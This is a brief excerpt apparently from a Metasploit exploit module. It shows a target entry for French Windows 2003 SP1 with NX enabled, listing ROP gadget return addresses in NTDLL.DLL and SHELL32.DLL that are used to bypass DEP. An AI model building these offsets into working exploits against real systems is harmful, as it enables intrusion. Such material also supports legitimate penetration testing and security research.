      ...
      'Targets'        =>
        [
          ...
          [ 'Windows 2003 SP1 French (NX)',
            {
              'RetDec'    => 0x7ca2568c,  # dec ESI, ret @NTDLL.DLL
              'RetPop'    => 0x7cb47cf4,  # push ESI, pop EBP, ret @SHELL32.DLL
